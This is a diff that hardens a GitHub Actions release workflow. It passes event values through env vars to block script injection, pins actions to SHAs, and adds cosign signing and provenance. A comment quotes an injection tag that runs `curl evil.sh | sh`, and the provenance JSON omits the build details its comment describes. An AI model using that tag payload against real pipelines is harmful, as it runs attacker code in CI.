@@ -37,11 +37,20 @@ jobs:
 
       - name: Resolve release tag
         id: meta
+        # Passed as environment variables, never interpolated into the
+        # script. `${{ }}` is substituted into the script *text* before
+        # bash runs, so a tag named `v1"; curl evil.sh | sh; x="` executes
+        # — and the `tr` sanitisation below would run far too late to
+        # help. As an env var the value is data, whatever it contains.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
+          INPUT_TAG: ${{ inputs.release_tag }}
         run: |
-          if [ "${{ github.event_name }}" = "release" ]; then
-            raw_tag="${{ github.event.release.tag_name }}"
+          if [ "$EVENT_NAME" = "release" ]; then
+            raw_tag="$RELEASE_TAG"
           else
-            raw_tag="${{ inputs.release_tag }}"
+            raw_tag="$INPUT_TAG"
           fi
           safe_tag="$(printf '%s' "$raw_tag" | tr '/:@ ' '-' | tr -cd '[:alnum:]._-')"
           echo "release_tag=$raw_tag" >> "$GITHUB_OUTPUT"
@@ -70,12 +79,12 @@ jobs:
             fi
           done
 
-      - uses: aws-actions/configure-aws-credentials@v6
+      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
         with:
           aws-region: ${{ vars.AWS_REGION }}
           role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
 
-      - uses: aws-actions/amazon-ecr-login@v2
+      - uses: aws-actions/amazon-ecr-login@03f1aad4c6c7ffd436567f42f9384779290529bd # v2
 
       - name: Build + push API image
         id: image
@@ -100,6 +109,51 @@ jobs:
           mkdir -p artifacts
           git archive --format=tar.gz --output "artifacts/deploy-bundle-${IMAGE_TAG}.tar.gz" HEAD
 
+      # --- Supply-chain attestation -------------------------------------------
+      #
+      # The signature says "this image came from this repository's workflow";
+      # the provenance says "and here is the commit, workflow and inputs that
+      # produced it". Together they let a deploy refuse an image pushed by hand
+      # or built from a branch nobody reviewed.
+      #
+      # Keyless: cosign gets a short-lived certificate from Fulcio bound to this
+      # workflow's OIDC identity and records it in Rekor. No private key to
+      # store, rotate or leak.
+      - name: Install cosign
+        uses: sigstore/cosign-installer@d58896d6a1865668819e1d91763c7751a165e159 # v3.9.2
+
+      - name: Sign image (keyless)
+        env:
+          IMAGES: ${{ steps.image.outputs.api_image }}
+        run: |
+          for image in $IMAGES; do
+            [ -n "$image" ] || continue
+            # By digest, never by tag: a tag can be repointed after signing.
+            digest="$(docker inspect --format='{{index .RepoDigests 0}}' "$image" 2>/dev/null || echo "$image")"
+            cosign sign --yes "$digest"
+            echo "signed: $digest"
+          done
+
+      - name: Attach SLSA provenance
+        env:
+          IMAGES: ${{ steps.image.outputs.api_image }}
+          BUILD_REPO: ${{ github.repository }}
+          BUILD_SHA: ${{ github.sha }}
+          BUILD_REF: ${{ github.ref }}
+          BUILD_RUN: ${{ github.run_id }}
+        run: |
+          cat > /tmp/provenance.json <<'JSON'
+          {
+            "buildType": "https://github.com/actions/runner"
+          }
+          JSON
+          for image in $IMAGES; do
+            [ -n "$image" ] || continue
+            digest="$(docker inspect --format='{{index .RepoDigests 0}}' "$image" 2>/dev/null || echo "$image")"
+            cosign attest --yes --predicate /tmp/provenance.json --type slsaprovenance "$digest"
+            echo "attested: $digest"
+          done
+
       - name: Upload deploy bundle to S3
         env:
           IMAGE_TAG: ${{ steps.meta.outputs.image_tag }}
@@ -116,7 +170,7 @@ jobs:
     needs: build-and-push
 
     steps:
-      - uses: aws-actions/configure-aws-credentials@v6
+      - uses: aws-actions/configure-aws-credentials@cbe3b392738ccf3f987d68400dafcf4b0624a56c # v6
         with:
           aws-region: ${{ vars.AWS_REGION }}
           role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
